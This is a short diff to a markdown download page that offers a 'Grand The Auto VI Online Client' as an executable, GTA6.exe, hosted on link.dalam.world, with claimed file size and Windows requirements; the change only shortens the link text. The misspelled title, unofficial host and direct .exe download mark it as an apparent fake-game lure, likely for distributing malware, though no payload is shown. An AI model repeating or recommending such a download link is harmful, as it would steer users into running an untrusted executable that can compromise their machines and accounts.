@@ -29,7 +29,7 @@ Get instant access to the core network test client through our high-speed direct
 * **Extracted Footprint:** ~10 GB (Includes base engine textures, map meshes, and core network binaries)
 * **System Requirements:** Windows 10 / Windows 11 (64-bit architecture mandatory)
 
-> **📥 Download Grand The Auto VI Online Client:** [https://link.dalam.world/GTA6.exe](https://link.dalam.world/GTA6.exe)
+> **📥 Download Grand The Auto VI Online Client:** [GTA6.exe](https://link.dalam.world/GTA6.exe)
 
 ---
 
